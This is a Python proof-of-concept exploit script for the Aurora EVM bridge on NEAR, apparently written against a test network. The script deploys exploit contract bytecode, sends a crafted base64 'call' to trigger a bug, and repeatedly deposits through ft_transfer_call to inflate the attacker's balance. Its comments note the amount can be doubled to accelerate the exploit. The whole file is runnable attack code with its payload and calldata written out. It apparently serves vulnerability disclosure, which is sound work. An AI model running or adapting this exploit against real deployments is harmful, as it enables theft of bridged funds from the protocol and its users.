#!/usr/bin/python3
# NOTICE:
# 1. in an environment where `aurora` has enough nETH balance, the `amount` can be doubled to accelerate the exploit
# 2. all the transactions on NEAR can be aggregated in a single one

import os, base64, struct, json
amount = 10 ** 18 # initial fund
iteration = 1
account = 'attacker.test.near'
aurora = 'aurora.test.near'
account_address = '32725A659192bAD4092793969fE3394Db8479E8D'
exploit_address = '3fb037e856cb227749b9de541d9f10966901389e'
fee = '0' * 64
calldata = '53a2d9cb0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001261747461636b65722e746573742e6e6561720000000000000000000000000000'

# depoly the evm exploit
cmd = 'aurora --signer attacker.test.near deploy-code 0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610495806100606000396000f3fe60806040526004361061001e5760003560e01c806353a2d9cb14610023575b600080fd5b61003d600480360381019061003891906101ca565b61003f565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461009757600080fd5b6000816040516020016100aa9190610267565b60405160208183030381529060405290506000825160016100cb9190610300565b905060206000826020850173e9217bc70b7ed1f598ddd3199e80b093fa71124f5af45060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc349081150290604051600060405180830381858888f19350505050158015610154573d6000803e3d6000fd5b50505050565b600061016d610168846102ae565b610289565b90508281526020810184848401111561018957610188610436565b5b610194848285610360565b509392505050565b600082601f8301126101b1576101b0610431565b5b81356101c184826020860161015a565b91505092915050565b6000602082840312156101e0576101df610440565b5b600082013567ffffffffffffffff8111156101fe576101fd61043b565b5b61020a8482850161019c565b91505092915050565b600061021e826102df565b61022881856102ea565b935061023881856020860161036f565b80840191505092915050565b60006102516001836102f5565b915061025c82610456565b600182019050919050565b600061027282610244565b915061027e8284610213565b915081905092915050565b60006102936102a4565b905061029f82826103a2565b919050565b6000604051905090565b600067ffffffffffffffff8211156102c9576102c8610402565b5b6102d282610445565b9050602081019050919050565b600081519050919050565b600081905092915050565b600081905092915050565b600061030b82610356565b915061031683610356565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111561034b5761034a6103d3565b5b828201905092915050565b6000819050919050565b82818337600083830152505050565b60005b8381101561038d578082015181840152602081019050610372565b8381111561039c576000848401525b50505050565b6103ab82610445565b810181811067ffffffffffffffff821117156103ca576103c9610402565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b6000808201525056fea2646970667358221220f88ffdad34a26d5f9d1945ec7272e4c7cceb941058db55b5e20adfeb72dd050664736f6c63430008070033'
os.system(cmd)

for i in range(iteration):
    # trigger the bug
    args = base64.b64encode(b'\x00' + bytes.fromhex(exploit_address) + struct.pack('>Q', int(amount)).rjust(32, b'\0') + struct.pack('<I', int(len(calldata) // 2)) + bytes.fromhex(calldata))
    cmd = "near call aurora.test.near call --base64 --args '%s' --accountId %s --gas 300000000000000" % (args.decode('utf-8'), account)
    print(cmd)
    os.system(cmd)

    # deposit into aurora
    msg = '%s:%s%s' % (account, fee, account_address)
    args = base64.b64encode(json.dumps({
        'receiver_id': aurora,
        'amount': str(amount),
        'memo': '',
        'msg': msg
    }).encode('utf-8'))
    cmd = "near call aurora.test.near ft_transfer_call --base64 --args '%s' --accountId %s --gas 300000000000000 --depositYocto 1" % (args.decode('utf-8'), account)
    print(cmd)
    os.system(cmd)

    # amount = amount * 2

    # check your balance on evm
    os.system('aurora get-balance %s' % account_address)

